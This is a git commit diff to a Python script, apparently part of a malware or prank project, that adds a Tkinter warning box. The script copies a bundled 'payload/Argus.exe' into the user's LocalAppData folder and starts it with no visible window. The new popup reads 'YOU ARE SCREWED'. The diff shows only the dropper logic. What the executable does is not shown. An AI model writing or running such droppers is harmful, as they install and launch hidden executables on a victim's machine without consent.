cfba2ce69785ddf14c386589ca633c41c5fb9bb7
DarkGlitchLegion <darkglitchdev@gmail.com>
2026-09-19 02:36:25 +0800

    feat: add messagebox

--- main.py
+++ main.py
@@ -2,8 +2,13 @@ import os
 import shutil
 import subprocess
 from pathlib import Path
+import tkinter as tk
+from tkinter import messagebox
 
 def main():
+    root = tk.Tk()
+    root.withdraw()
+
     source_exe = Path(__file__).resolve().parent / "app" / "payload" / "Argus.exe"
 
     argus_dir = Path(os.environ["LOCALAPPDATA"]) / "Argus"
@@ -16,7 +21,7 @@ def main():
     subprocess.Popen([str(destination_exe)], creationflags=subprocess.CREATE_NO_WINDOW)
 
     print(f"Copied to: {destination_exe}")
-    print(f"Argus Started")
+    messagebox.showwarning("ZHASK", "YOU ARE SCREWED")
 
 if __name__ == "__main__":
     main()
